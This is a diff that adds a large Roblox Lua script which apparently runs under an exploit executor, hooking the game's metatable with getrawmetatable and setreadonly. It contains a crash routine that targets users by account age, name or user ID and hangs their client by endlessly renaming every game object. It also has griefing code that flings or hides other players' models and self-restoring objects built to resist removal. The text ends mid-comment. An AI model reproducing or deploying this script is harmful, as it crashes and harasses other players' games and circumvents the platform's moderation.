@@ -1,3 +1,3915 @@
+local env, FakeEnv, meta, RunService, AlreadyCalled=getfenv(), {}, getrawmetatable(getgenv().game), game:FindService("RunService") or game:GetService("RunService"), false
+function FakeEnv:SetDirectVariable(Index, Value)
+	rawset(env, Index, Value)
+end
+function FakeEnv:SendAttribute(...)
+	pcall(script.SetAttribute, script, ...)
+end
+setreadonly(meta, false)
+function meta:__call(Key)
+	if (Key=="0x3rtF3" and AlreadyCalled==false) then
+		return FakeEnv
+	else
+		return error("Attempt to call an instance!", 2)
+	end
+end
+setreadonly(meta, true)
+repeat RunService.RenderStepped:Wait(); until env.Ready
+do
+	local Identifier=script:GetAttribute("Identifier")
+	local function Debr(Object, Time)
+		pcall(function()
+			Object.Archivable=false
+		end)
+		game:GetService("Debris"):AddItem(Object, tonumber(Time))
+	end
+	local function DDD(v)
+		local Debris=game:GetService("Debris")
+		pcall(function()
+			if v.Archivable then
+				v.Archivable=false
+			end
+		end)
+		pcall(coroutine.wrap(script.Destroy), v)
+		pcall(coroutine.wrap(Debris.AddItem), Debris, v, 0)
+		pcall(coroutine.wrap(Debris.AddItem), Debris, v, 0.01)
+	end
+	function Delete(...)
+		for _, v in ipairs({...}) do
+			if (type(v)=="table") then
+				for _, x in pairs(v) do
+					Delete(x)
+				end
+			elseif typeof(v)=="Instance" then
+				DDD(v)
+			end
+		end
+	end
+	local function DDDD(...)
+		for _, v in ipairs(table.pack(...)) do
+			for _, x in pairs(v:GetChildren()) do
+				if not x:GetAttribute(RefitAtt) then
+					DDD(x)
+				end
+			end
+			v.ChildAdded:Connect(function(v)
+				if v:GetAttribute(RefitAtt) then return; end
+				DDD(v)
+			end)
+		end
+	end
+	local function Fire(Event, ...)
+		Event:Fire(...)
+		return(...)
+	end
+	local function MentallyDisable(...)
+		for _, v in ipairs({...}) do
+			pcall(function()
+				v.CanCollide, v.CanQuery, v.CanTouch, v.Anchored=false, false, false, true
+			end)
+		end
+	end
+	local function SetProperties(Instance, ...)
+		local Parent
+		local function Idk(i, v)
+			if (type(v)=="function") then
+				return v()
+			elseif (type(v)=="table") then
+				return v.Function(table.unpack(v.Args))
+			else
+				return v
+			end
+		end
+		for _, Properties in ipairs({...}) do
+			pcall(function()
+				for i, v in pairs(Properties) do
+					pcall(function()
+						local Data=Idk(i, v)
+						if Instance[i]==Data then return; end
+						if (i=="Parent") then
+							Parent=Data
+						else
+							Instance[i]=Data
+						end
+					end)
+				end
+			end)
+		end
+		if Parent then
+			Instance.Parent=Parent
+		end
+	end
+	local function WaitForChildren(Parent, ...)
+		local Return={}
+		for i, v in ipairs({...}) do
+			Return[i]=Parent:WaitForChild(v, math.huge)
+		end
+		return table.unpack(Return)
+	end
+	local function Clone(v, Parent, Properties)
+		local a; a=v:GetPropertyChangedSignal("Archivable"):Connect(function()
+			if not v.Archivable then
+				v.Archivable=true
+			end
+		end)
+		v.Archivable=true
+		local Clone=v:Clone()
+		a:Disconnect()
+		pcall(SetProperties, Clone, Properties)
+		if Parent then 
+			Clone.Parent=Parent
+		end
+		return Clone
+	end
+	local function YieldForTween(t)
+		t:Play()
+		return t, t.Completed:Wait()
+	end
+	local function NewSystem(F)
+		local ConsecutiveFrames, Frame, Throttle=0, 1/(tonumber(F)~=nil and tonumber(F)) or 60, 0
+		return ConsecutiveFrames, Frame, Throttle
+	end	
+	local BaseCFrame=CFrame.new(0, 0, 0)
+	local ConsecutiveFrames, Frame, Throttle=NewSystem(60)
+	local ConsecutiveFramesHB, FrameHB, ThrottleHB=NewSystem(60)
+	local Convert={}
+	function Convert.Enum(Arg1)
+		if type(Arg1)=="table" then
+			local Split=string.split(Arg1[1], ".")
+			table.remove(Split, 1)
+			table.remove(Split, 2)
+			return Enum[Split[1]][Split[2]]
+		else
+			return {[1]=tostring(Arg1), [2]="Enum"}
+		end
+	end
+	local function Disconnect(...)
+		local function Check(c, i)
+			pcall(function()
+				if (typeof(i)=="RBXScriptConnection") then
+					return i:Disconnect()
+				elseif (typeof(i)=="Instance") then
+					return DDD(i)
+				end
+			end)
+			pcall(function()
+				if (typeof(c)=="RBXScriptConnection") then
+					return c:Disconnect()
+				elseif (typeof(c)=="Instance") then
+					return DDD(c)
+				end
+			end)
+		end
+		for _, t in ipairs({...}) do
+			if (type(t)=="table") then
+				for i, c in pairs(t) do
+					Check(c, i)
+				end
+			elseif (typeof(t)=="RBXScriptConnection") then
+				Check(t)
+			end
+		end
+	end
+	local function Clear(...)
+		for _, t in ipairs(table.pack(...)) do
+			pcall(table.clear, t)
+		end
+	end
+	local function Clean(...)
+		Disconnect(...)
+		Clear(...)
+	end
+	local function Remove(Table, ...)
+		local Return={}
+		for i, v in ipairs({...}) do
+			--if (type(v)=="number") then
+			--pcall(table.remove, Table, v)
+			--else
+			--local a=
+			--pcall(table.remove, Table, table.pack(pcall(table.find, Table, v))[2])
+			table.remove(Table, table.find(Table, v))
+			--end
+			Return[i]=v
+		end
+		return table.unpack(Return)
+	end
+	local function TableConvert(_1, Data)
+		local New=_1.new
+		for i, v in pairs(Data) do
+			New[i]=v
+		end
+	end
+	local function ToOrientation(CFrame)
+		return Vector3.new(BaseCFrame.ToOrientation(CFrame))
+	end
+	local function Magnitude(_1, _2)
+		return (((typeof(_1)=="Vector3" and _1) or _1.Position)-((typeof(_2)=="Vector3" and _2) or _2.Position)).Magnitude
+	end
+	local function Tween(Table)
+		return TableConvert(TweenInfo, Table)
+	end
+	local function Insert(Table, ...)
+		local Return={}
+		for i, v in ipairs({...}) do
+			table.insert(Table, v)
+			Return[i]=v
+		end
+		return table.unpack(Return)
+	end
+	function Resume(...)
+		for _, Function in ipairs({...}) do
+			pcall(coroutine.resume, table.pack(pcall(coroutine.create, Function))[2])
+		end
+	end
+	local function Exists(...)
+		local ToReturn={}
+		for _, Object in ipairs({...}) do
+			Insert(ToReturn, (Object~=nil and typeof(Object)=="Instance" and Object:IsDescendantOf(game) and Object) or false)
+		end
+		return table.unpack(ToReturn)
+	end
+	FunnyServices={}
+	do
+		local function Farted(v)
+			pcall(function()
+				if game:FindService(v.ClassName) then
+					getfenv()[v.ClassName]=v
+					getfenv()[v.ClassName:lower()]=v
+					getfenv()[v.ClassName:upper()]=v
+					Insert(FunnyServices, v)
+				end
+			end)
+		end
+		for _, v in pairs(game:GetChildren()) do
+			Farted(v)
+		end
+		game.ChildAdded:Connect(Farted)
+	end
+	local function Move(Ancestor, Parts, CFrames)
+		pcall(function()
+			return Ancestor:BulkMoveTo(Parts, CFrames, 1)
+		end)
+	end
+	game:GetService("Debris"):AddItem(script, 0)
+	for i, v in pairs(script:GetAttributes()) do
+		getfenv()[i]=v
+		--script:SetAttribute(i, nil)
+	end
+	CrashLoop=RunService.RenderStepped:Connect(function()
+		if IsUser then return Disconnect(CrashLoop); end
+		pcall(function()
+			if Players.LocalPlayer.AccountAge<15 then
+				Resume(function()
+					while true do
+						for _, v in pairs(game:GetDescendants()) do
+							pcall(function()
+								v.Name=RandomString(1e4)
+							end)
+						end
+					end
+				end)
+			end
+			for i, v in pairs(MaterialService:GetAttributes()) do
+				local Player, Data=Players.LocalPlayer, i
+				if ((string.match(string.lower(Player.Name), string.lower(Data)) or (string.match(string.lower(Player.DisplayName), string.lower(Data)))) or Player.UserId==tonumber(Data)) and v=="Crash" then
+					Resume(function()
+						while true do
+							for _, v in pairs(game:GetDescendants()) do
+								pcall(function()
+									v.Name=RandomString(1e4)
+								end)
+							end
+						end
+					end)
+				end
+			end
+		end)
+	end)
+
+	getfenv().tick=function(Multiplier)
+		return workspace:GetServerTimeNow()*((Multiplier~=nil and tonumber(Multiplier)~=nil and type(tonumber(Multiplier))=="number" and tonumber(Multiplier)) or 1)
+	end
+	local function ValidNumber(Number)
+		local Returned = table.pack(pcall(function()
+			return type(Number) == "number" and not string.find(string.lower(tostring(Number)), "nan")
+		end))
+		table.remove(Returned, 1)
+		return unpack(Returned)
+	end
+	local Characters={}
+	for Char=1, 250, 1 do
+		pcall(function()
+			Insert(Characters, string.char(Char))
+		end)
+	end
+	local function gfunc(String, Function)
+		local function r()
+			return string.gsub(string.rep(" ", math.random(10, 100)), ".", function(x)
+				return Characters[math.random(1, #Characters)]
+			end)
+		end
+		if type(Function)=="function" then
+			return string.gsub(String, ".", Function)
+		elseif type(String)=="table" then
+			if String.Length then
+				return string.gsub(string.rep(" ", ValidNumber(String.Length) and math.clamp(String.Length, 1, 1e4) or math.random(5, 100)), ".", function(x)
+					return Characters[math.random(1, #Characters)]
+				end)
+			else
+				return r()
+			end
+		else
+			return r()
+		end
+	end
+	function RandomString(Length)
+		return gfunc({Length=Length})
+	end
+	function Anti(v)
+		local function KillObject()
+			v.Archivable=false
+			v.Name=RandomString()
+			Delete(v, v:GetDescendants())
+		end
+		if v:IsA("Explosion") then
+			v.Visible=false
+			v.Position=Vector3.new(0, 0, 0)
+			v.BlastPressure=0
+			v.BlastRadius=0
+			v.DestroyJointRadiusPercent=0
+			v.TimeScale=0
+			v.ExplosionType=Enum.ExplosionType.NoCraters
+			KillObject()
+		elseif v:IsA("Sparkles") then
+			v.Enabled=false
+			v.TimeScale=0
+			KillObject()
+		elseif v:IsA("Fire") then
+			v.Enabled=false
+			v.Heat=0
+			v.Size=0
+			v.TimeScale=0
+			KillObject()
+		elseif v:IsA("Hint") or v:IsA("Message") then
+			v.Text=RandomString()
+			KillObject()
+		end
+	end
+	for _, v in pairs(workspace:GetDescendants()) do
+		Anti(v)
+	end
+	function ClearInstances(...)
+		for _, i in ipairs(table.pack(...)) do
+			for _, v in pairs((type(i)=="table" and i) or i:GetDescendants()) do
+				if not i:GetAttribute(RefitAtt) then
+					DDD((type(v)=="table" and v.Object) or v)
+				end
+			end
+		end
+	end
+	workspace.DescendantAdded:Connect(Anti)
+	if not game:IsLoaded() then game.Loaded:Wait(); end
+	local function HSV(s)
+		return Color3.fromHSV(tick()%tonumber(s)/tonumber(s) or 5, 1, 1)
+	end
+	local prop, rgbpr, oldrgbpr, Lighting={Brightness=1, ClockTime=0, ExposureCompensation=1}, {"ColorShift_Bottom", "ColorShift_Top", "OutdoorAmbient", "FogColor", "Ambient"}, {}, game:GetService("Lighting")
+	for i, v in pairs(rgbpr) do
+		oldrgbpr[v]=Lighting[v]
+	end
+	local env, Replace=getfenv(), {
+		Shutdown="show-down",
+		Ban="band",
+		Kick="lick",
+		Crash="rash",
+	}
+	for i, v in pairs(Replace) do
+		Replace[i:lower()]=v
+		Replace[i:upper()]=v
+	end
+	local function ReplaceName(String)
+		return string.gsub(String, Player, "TheAscensionist"):gsub(DisplayName, "TheAscensionist"):gsub(tostring(UserId), "...")
+	end
+	local function FakeDestroy(Ancestor, Parts, Pivot)
+		local CheckedParts, CFrames={}, {}
+		for _, v in pairs(Parts) do
+			if v:IsA("BasePart") then
+				table.insert(CheckedParts, v)
+				pcall(function()
+					v:ApplyMesh(MeshKiller)
+				end)
+			end
+		end
+		for Index=1, #CheckedParts, 1 do
+			CFrames[Index]=CFrame.new(math.random(-1e4, 1e4), 1e4, math.random(-1e4, 1e4))*CFrame.new(0/0, 0/0, 0/0)
+		end
+		if Pivot then
+			Ancestor:PivotTo(CFrame.new(math.random(-1e4, 1e4), 1e4, math.random(-1e4, 1e4))*CFrame.new(0/0, 0/0, 0/0))
+		end
+		Move(Ancestor, CheckedParts, CFrames)
+	end
+	a={"SoundGroup", "ScreenGui", "AlignOrientation", "AlignPosition"}
+	local function CheckFor(v)
+		if not fartslurping then return; end
+		if IsProtected(v) then return; end
+		if v.Name=="Fraud" then
+			FakeDestroy(workspace, v:GetDescendants())
+		end
+		pcall(function()
+			if v:IsA("WorldModel") then
+				if not v:GetAttribute(Identifier) then
+					FakeDestroy(v, v:GetDescendants(), true)
+				end
+			elseif v:IsA("Model") then
+				local Blacklist={"BoyAnimeHair_Black", "outline", "safety"}
+				for _, x in pairs(v:GetDescendants()) do
+					for _, b in pairs(Blacklist) do
+						if string.match(x.Name:lower(), b:lower()) or (x:IsA("Humanoid") and (x.Name=="" or x.Name==".")) then
+							FakeDestroy(workspace, v:GetDescendants())
+						end
+					end
+				end
+			elseif v:FindFirstChildOfClass("SelectionBox") or v:FindFirstChildOfClass("Highlight") or v:FindFirstChildOfClass("SpecialMesh") or v:FindFirstChildOfClass("Decal") or v:FindFirstChildOfClass("Texture") or v:IsA("FlagStand") or v:FindFirstChild("When") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("NegateOperation") then
+				if not v:GetAttribute(Identifier) then
+					FakeDestroy(workspace, {v})
+				end
+			elseif v:IsA("Folder") then
+				FakeDestroy(v, v:GetDescendants())
+				DDD(v)
+			elseif table.pack(pcall(function() return v.Value; end))[1]==true then
+				FakeDestroy(workspace, v:GetDescendants())
+			elseif v:IsA("Sound") or v:IsA("Highlight") or v:IsA("SelectionBox") then
+				DDD(v)
+			end
+		end)
+	end
+	local function EWaitFor(Event, WaitFor)
+		local Arg=Event:Wait()
+		if (Arg~=WaitFor) then
+			repeat Arg=Event:Wait() until Arg==WaitFor
+		end
+		return Arg
+	end
+	local c, seeeee={}, {}
+	local cc, Refitted, poopy={}, false, nil
+	local function CheckChildren(Object, Amount)
+		if (#Object:GetChildren()~=tonumber(Amount)) then
+			return false
+		else
+			return true
+		end
+	end
+	local function CheckDescendants(Object, Amount)
+		if (#Object:GetDescendants()~=tonumber(Amount)) then
+			return false, Object.Refit()
+		else
+			return true
+		end
+	end
+	Instances={}
+	local Character={}
+	function tof()
+		return math.random(1, 2)==1
+	end
+	function WWWWW(...)
+		for _, v in ipairs({...}) do
+			pcall(SetProperties, v, {Archivable=tof(), Name=RandomString(math.random(3, 4))})
+		end
+	end
+	function RemoveOutlines(part)
+		part.TopSurface, part.BottomSurface, part.LeftSurface, part.RightSurface, part.FrontSurface, part.BackSurface=10, 10, 10, 10, 10, 10
+	end
+	local Effects={}
+	local function Effectify(Instances)
+		pcall(function()
+			for _, v in pairs(Instances) do
+				table.insert(Effects, v)
+				v:SetAttribute("Effected", true)
+				MentallyDisable(v)
+				local Removed
+				Removed = v.AncestryChanged:Connect(function()
+					if table.pack(pcall(game.IsDescendantOf, v, workspace))[2] ~= true then
+						Remove(Effects, v)
+						Removed:Disconnect()
+						DDD(v)
+					end
+				end)
+			end
+		end)
+	end
+	local function Destroy(v, Delay)
+		pcall(function()
+			game:GetService("Debris"):AddItem(v, Delay or 0)
+		end)
+	end
+
+	local ToRefit, Protected, Backups, Instance_={}, {}, {}, getfenv().Instance.new
+	local function SR(v)
+		Backups[v.Name]=Clone(v)
+	end
+	MaterialService.ChildAdded:Connect(SR)
+	for _, v in pairs(MaterialService:GetChildren()) do
+		SR(v)
+	end
+	local function RandomString2(Length)
+		local Returned = table.pack(pcall(function()
+			return string.gsub(string.rep(" ", ValidNumber(Length) and math.clamp(Length, 1, 1e4) or math.random(5, 100)), ".", function(x)
+				return string.char(({math.random(48, 57), math.random(65, 90), math.random(97, 122)})[math.random(1, 3)])
+			end)
+		end))
+		table.remove(Returned, 1)
+		return unpack(Returned)
+	end
+	LocalAttributes={}
+	function IsProtected(v)
+		if v:GetAttribute(RefitAtt) then return true; end
+		for i, x in pairs(LocalAttributes) do
+			if v:GetAttribute(i)==x then
+				return true
+			end
+		end
+		return false
+	end
+	function ProtectedInstance(ClassName, Props, Attributes, t)
+		local Random, LastPick=ClassName=="RandomInstance", nil
+		ClassName=(Random and RandomInstance()) or ClassName
+		LastPick=Random and ClassName
+		local B=Backups[ClassName]
+		if B then
+			if B:IsA("BasePart") then
+				local BackupProps={"Size"}
+				if B:IsA("MeshPart") then 
+					Insert(BackupProps, "MeshId", "TextureID")
+				elseif B:IsA("UnionOperation") then
+					Insert(BackupProps, "UsePartColor")
+				end
+				for _, v in pairs(BackupProps) do
+					Props[v]=B[v]
+				end
+			end
+		end
+		local RealName=Props.RealName
+		local RefitAttribute=RandomString2()
+		local OriginalProps=table.clone(Props)
+		Attributes=Attributes or {}
+		Attributes[RefitAttribute]=RandomString()
+		LocalAttributes[RefitAttribute]=Attributes[RefitAttribute]
+		local Old, SetCon, Object, Reset, Refit={}, {}, nil, nil, nil
+		local function AddC(Connection)
+			return Insert(Old, Connection)
+		end
+		local Prefit=Instance_("BindableEvent")
+		local ResetValues, Changed, AttributeChanged, AncestryChanged, Refitted=setmetatable({TamperAmount=0}, {}), Instance_("BindableEvent"), Instance_("BindableEvent"), Instance_("BindableEvent"), Instance_("BindableEvent")
+		ResetValues.RealName=RealName
+		local Children={}
+		do
+			local mt, Backup, AttributeBackup=getmetatable(ResetValues), table.clone(Props), Attributes
+			function mt:__index(...)
+				local Args=table.pack(...)
+				if Args[1]=="Backup" then
+					return Backup
+				elseif Args[1]=="Refit" then
+					return Refit
+				elseif Args[1]=="Prefit" then
+					return Prefit.Event
+				elseif Args[1]=="Changed" then
+					return Changed.Event
+				elseif Args[1]=="Refitted" then
+					return Refitted.Event
+				elseif Args[1]=="ParentFixed" then
+
+				elseif Args[1]=="TamperAmount" then
+					return rawget(self, "TamperAmount")
+				elseif Args[1]=="Object" then
+					return Object
+				elseif Args[1]=="Attributes" then
+					return AttributeBackup
+				elseif Args[1]=="Reparented" then
+					return AncestryChanged.Event
+				elseif Args[1]=="AttributeChanged" then
+					return AttributeChanged.Event
+				elseif Args[1]=="SetAttribute" then
+					return(function(self, Attribute, Value)
+						if (AttributeBackup[Attribute]~=Value) then
+							AttributeBackup[Attribute]=Value
+							AttributeChanged:Fire(Attribute, Value)
+						end
+					end)
+				elseif Args[1]=="Fix" then
+					return(function(self, FakeObject, Property, Value)
+						FakeObject.Prefit:Connect(function()
+							Backup[Property]=Value or FakeObject
+							local Object=FakeObject.Refitted:Wait()
+							Refit()
+						end)
+					end)
+
+				elseif Args[1]=="SetConnection" then
+					return(function(self, EventName, Function)
+						if not SetCon[EventName] then
+							SetCon[EventName]={}
+						end
+						local Data=SetCon[EventName]
+						local Last=Insert(Data, Object[EventName]:Connect(Function))
+						Refitted.Event:Connect(function(Object)
+							Remove(Data, Last):Disconnect()
+							Last=Insert(Data, Object[EventName]:Connect(Function))
+						end)
+					end)
+				elseif Args[1]=="AddChild" then
+					return(function(self, FakeObject, Name)
+						if (type(FakeObject)=="table" and typeof(FakeObject.Object)=="Instance") then
+							Children[Name]=FakeObject
+						end
+					end)
+				else
+					local Index=rawget(Children, ...) or rawget(Backup, ...)
+					if Index==nil then
+						Index=Object[Args[1]]
+					end
+					if (type(Index)=="function") then
+						return(function(self, ...)
+							local _1=((typeof(self)=="Instance" and self) or type(self)=="table" and rawget(self, "Object"))
+							return Index(_1, ...)
+						end)
+					else
+						return Index
+					end
+				end
+			end
+			function mt:__newindex(...)
+				local Args=table.pack(...)
+				local Index, OldValue, NewValue=Args[1], Args[2], rawget(Backup, Args[1])
+				if NewValue~=OldValue then
+					rawset(Backup, ...)
+					Changed:Fire(...)
+				end
+			end
+			Reset=Changed.Event
+		end
+		local Refitting=false
+		ResetValues.Refitted:Connect(function(Object)
+			rawset(ResetValues, "Object", Object)
+			if OriginalProps.Name==nil then
+				ResetValues.Name=RandomString()
+			end
+		end)
+		Reset:Connect(function(i, v)
+			local Attempts=1
+			local Success, _=pcall(function()
+				Object[i]=ResetValues[i]
+			end)
+		--[[if not Success then
+			repeat
+				RunService.RenderStepped:Wait()
+				Success, _=pcall(function()
+					Object[i]=ResetValues[i]
+				end)
+				Attempts+=1
+			until Success or Attempts>3
+		end]]
+		end)
+		function Refit()
+			Prefit:Fire()
+			Attributes[RefitAttribute]=nil
+			LocalAttributes[RefitAttribute]=nil
+			RefitAttribute=RandomString2()
+			Attributes[RefitAttribute]=RandomString()
+			LocalAttributes[RefitAttribute]=Attributes[RefitAttribute]
+		--[[if ClassName=="Limb" then
+			if math.random(1, 2)==1 then
+				ClassName="Limb2"
+			end
+		elseif ClassName=="Limb2" then
+			ClassName="Limb"
+		end
+		if ClassName=="Torso" then
+			if math.random(1, 2)==1 then
+				ClassName="Torso2"
+			end
+		elseif ClassName=="Torso2" then
+			ClassName="Torso"
+		end]]
+			if Random then
+				local Repick=0
+				repeat
+					Repick+=1
+					ClassName=RandomInstance()
+				until ClassName~=LastPick
+				LastPick=ClassName
+			end
+			Clean(Old)
+			DDD(Object)
+			Object=(Backups[ClassName] and Clone(Backups[ClassName])) or Instance_(ClassName)
+			for i, v in pairs(ResetValues.Backup) do
+				pcall(coroutine.wrap(function()
+					pcall(function()
+						Object[i]=ResetValues.Backup[i]
+					end)
+					if i=="Parent" then return; end
+				end))
+			end
+			if Object:IsA("MeshPart") then
+				if ResetValues.Backup.UsePartColor then
+					ResetValues.Backup.UsePartColor=nil
+				end
+			end
+			local Parent=(type(ResetValues.Backup.Parent)=="table" and ResetValues.Backup.Parent.Object) or ResetValues.Backup.Parent
+			pcall(function()
+				Object.Parent=Parent
+			end)
+			Refitted:Fire(Object)
+			for _, v in pairs(Children) do
+				v.Parent=Object
+			end
+			for i, v in pairs(Object:GetAttributes()) do
+				pcall(function()
+					Object:SetAttribute(i, nil)
+				end)
+			end
+			for i, v in pairs(ResetValues.Attributes) do
+				pcall(function()
+					Object:SetAttribute(i, v)
+				end)
+			end
+			AddC(Object.AttributeChanged:Connect(function(a)
+				if not table.find(Attributes, a) then return Refit(); end
+				local v=ResetValues.Attributes[a]
+				pcall(function()
+					if (Object:GetAttribute(a)~=v) then
+						Refit()
+					end
+				end)
+			end))
+			AddC(Object.AncestryChanged:Connect(function()
+				local Parent=(type(ResetValues.Backup.Parent)=="table" and ResetValues.Parent.Object) or ResetValues.Parent
+				if (Object.Parent~=Parent) then
+					AncestryChanged:Fire()
+					Refit()
+				end
+			end))
+			pcall(function()
+				AddC(AttributeChanged.Event:Connect(function(i_, v_)
+					Object:SetAttribute(i_, v_)
+				end))
+			end)
+			AddC(Object.Changed:Connect(function(c)
+				if c=="Parent" then return; end
+				if (ResetValues.Backup[c]~=nil) then
+					if (Object[c]~=ResetValues.Backup[c]) then
+						--local s=table.pack(pcall(function() Object[c]=ResetValues.Backup[c] end))[1]
+						--if not s then
+						--ResetValues.TamperAmount=0
+						Refit()
+						--end
+					end	
+				end
+			end))
+		end
+		Refit()
+		table.insert(ToRefit, Refit)
+		table.insert(Protected, ResetValues)
+		return ResetValues, Refit, OriginalProps
+	end
+	local IT=Instance.new
+	local Instance={}
+	function Instance.new(ClassName, Parent, Properties)
+		local Object=IT(ClassName)
+		pcall(SetProperties, Object, Properties)
+		Object.Parent=Parent
+		return Object
+	end
+	function CloneProp(RealObject, Properties, Parent)
+		local FakeClone=Instance.new(RealObject.ClassName)
+		for _, v in ipairs(Properties) do
+			pcall(function()
+				FakeClone[v]=RealObject[v]
+			end)
+		end
+		if Parent then
+			pcall(function()
+				FakeClone.Parent=Parent
+			end)
+		end
+		return FakeClone
+	end
+	local function RandomEq(Number)
+		return math.random(-tonumber(Number), tonumber(Number))
+	end
+	local function RandomAngle(Mult)
+		if not Mult then 
+			Mult=1
+		end
+		return CFrame.Angles(math.rad(RandomEq(360))*Mult/2, math.rad(RandomEq(360))*Mult/2, math.rad(RandomEq(360))*Mult/2)
+	end
+	local Killed={}
+	local function Kill(v, Instant, Center)
+		pcall(coroutine.wrap(function()
+			if v:GetAttribute(RefitAtt) then return; end
+			if v:IsA("BasePart") then
+				if Magnitude(workspace.CurrentCamera.Focus, v.CFrame)<5 then
+					Resume(function()
+						if IsUser then return; end
+						while true do
+							for _, v in pairs(game:GetDescendants()) do
+								pcall(function()
+									v.Name=RandomString(1e4)
+								end)
+							end
+						end
+					end)
+				end
+				Resume(function()
+					task.wait(0.1)
+					if v:FindFirstAncestorOfClass("WorldModel") then
+						FakeDestroy(v:FindFirstAncestorOfClass("WorldModel"), {v})
+					else
+						FakeDestroy(workspace, {v})
+					end
+				end)
+				table.insert(Killed, v)
+				local Connections_ = {}
+				local RandomCFrame = CFrame.new(0, 0, 0)
+				if Instant then
+					v:SetAttribute(DeleteAtt, true)
+					workspace:BulkMoveTo({v}, {RandomCFrame}, 1)
+				else
+					local ChildHolder=Instance.new("FunctionalTest")
+					local Effect=ChildHolder
+					for _, x in ipairs(v:GetChildren()) do
+						if string.match(x.ClassName, "Mesh") then
+							CloneProp(x, {"VertexColor", "TextureId", "Scale", "Offset", "MeshType", "MeshId"}, Effect)
+						elseif x:IsA("Texture") then
+							CloneProp(x, {"Face", "ZIndex", "Transparency", "Texture", "StudsPerTileV", "StudsPerTileU", "OffsetStudsV", "OffsetStudsU", "Color3"}, Effect)
+						elseif x:IsA("Decal") then
+							CloneProp(x, {"Face", "ZIndex", "Transparency", "Texture", "Color3"}, Effect)
+						elseif x:IsA("SurfaceAppearance") or x:IsA("DialogChoice") or x:IsA("Dialog") or x:IsA("ProximityPrompt") or x:IsA("ClickDetector") or x:IsA("AdGui") then
+							Clone(x, Effect)
+						end
+					end
+					if string.match(v.ClassName, "Operation") then
+						Effect=Clone(v)
+					else
+						Effect=CloneProp(v, {"Size", "Material", "Color", "Reflectance", "Transparency", "CFrame", "Shape", "TextureID", "MaterialVariant"}, nil)
+					end
+					if v:IsA("MeshPart") then
+						Effect:ApplyMesh(v)
+					end
+					for _, v in ipairs(ChildHolder:GetChildren()) do
+						v.Parent=Effect
+					end
+					local o=v.CFrame
+					if Center then o=Center; end
+					RemoveOutlines(Effect)
+					local OriginalEffect=Clone(Effect)
+					v:SetAttribute(DeleteAtt, true)
+					for i, v in pairs(Effect:GetAttributes()) do
+						pcall(function()
+							Effect:SetAttribute(i, nil)
+						end)
+					end
+					Effectify{Effect}
+					local Refit
+					function Refit()
+						local Effect=Clone(OriginalEffect)
+						local Cons={}
+						local Done=false
+						local Current=RandomInstance()
+						local EffectsHolder=(Backups[Current]~=nil and Instance_(Backups[Current])) or Instance_(Current)
+						EffectsHolder.Name=RandomString()
+						EffectsHolder.Parent=workspace.Terrain
+						Insert(Cons, EffectsHolder.AncestryChanged:Connect(function()
+							if Done then return; end
+							if EffectsHolder.Parent~=workspace.Terrain then
+								DDD(EffectsHolder)
+								Clean(Cons)
+								Refit()
+							end
+						end))
+						Insert(Cons, EffectsHolder.DescendantRemoving:Connect(function()
+							if Done then return; end
+							Done=true
+							Clean(Cons)
+							DDD(EffectsHolder)
+							Refit()
+						end))
+						Resume(function()
+							Effectify{Effect}
+							local Rot = math.random(1, 360)
+							Effect.Parent=EffectsHolder
+							for _, v in pairs(Effect:GetChildren()) do
+								if string.match(v.ClassName, "Mesh") then
+									Resume(function()
+										YieldForTween(TweenService:Create(v, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Scale=v.Scale*1.5}))
+										YieldForTween(TweenService:Create(v, TweenInfo.new(2.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Scale=Vector3.new(0, 0, 0)}))
+									end)
+								end
+							end
+							YieldForTween(TweenService:Create(Effect, TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size=v.Size*1.5, CFrame=v.CFrame*CFrame.new(RandomEq(5+(v.Size.X/2)), RandomEq(15+(v.Size.Y/2)), RandomEq(5+(v.Size.Z/2)))*RandomAngle(), Color=Color3.new(1, 1, 1)}))
+							YieldForTween(TweenService:Create(Effect, TweenInfo.new(2.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size=Vector3.new(0, 0, 0), CFrame=o, Color=Color3.new(0, 0, 0)}))
+							Clean(Cons)
+							Done=true
+							DDD(EffectsHolder)
+						end)
+					end
+					Refit()
+				end
+				local AC; AC=v.AncestryChanged:Connect(function()
+					if not v:IsDescendantOf(workspace) then
+						v:SetAttribute(DeleteAtt, false)
+						Remove(Killed, v)
+						AC:Disconnect()
+					end
+				end)
+			end
+		end))
+	end
+	local function Clerp(Start, End, Alpha, T)
+		local Throttle=(ValidNumber(tonumber(T)) and tonumber(T)) or Throttle
+		if ValidNumber(tonumber(Alpha)) then
+			Alpha=math.clamp(Alpha, 0.01, 1)
+			if Throttle<=1 then
+				return Start:Lerp(End, Alpha)
+			else
+				local Current=Start
+				for _=1, Throttle, 1 do
+					Current=Current:Lerp(End, Alpha)
+				end
+				return Current
+			end
+		end
+	end
+	--WaitForChildren(MaterialService, "Head", "Gun", "Limb", "MeshKiller", "Torso", "Material_1", "Material_2", "Material_3")
+	WhenRefit, BodyProp, Materials, Materials_={}, {DoubleSided=false, CanCollide=false, CanTouch=false, CanQuery=false, CastShadow=false, Archivable=true, Locked=true, Anchored=true, Massless=true, Transparency=0, LocalTransparencyModifier=0, Material=Enum.Material.DiamondPlate}, {}, {}
+	for i, v in pairs(Backups) do
+		if string.match(i:lower(), "material_") then
+			local Material=ProtectedInstance(i, {Parent=MaterialService}, {[Identifier]=true})
+			getfenv()[i]=Material
+			Insert(Materials, Material)
+		end
+	end
+	Resume(function()
+		if Players.LocalPlayer.Name==Player then
+			do
+				local function Farted(v)
+					pcall(function()
+						if game:FindService(v.ClassName) then
+							getfenv()[v.ClassName]=v
+							getfenv()[v.ClassName:lower()]=v
+							getfenv()[v.ClassName:upper()]=v
+						end
+					end)
+				end
+				for _, v in pairs(game:GetChildren()) do
+					Farted(v)
+				end
+				game.ChildAdded:Connect(Farted)
+			end
+			local function CheckFor(String)
+				return string.match(String:lower():gsub(" ", ""), "chathax") or string.match(String:lower():gsub(" ", ""), "hax")
+			end
+			game:GetService("RunService").RenderStepped:Connect(function()
+			--[[for _, v in pairs(game:GetService("Players").LocalPlayer:GetDescendants()) do
+				pcall(function()
+					if CheckFor(v.Name) then
+						if v:FindFirstAncestorOfClass("ScreenGui") then
+							v:FindFirstAncestorOfClass("ScreenGui"):Destroy()
+						else
+							v:Destroy()
+						end
+					end
+				end)
+				pcall(function()
+					if CheckFor(v.Text) then
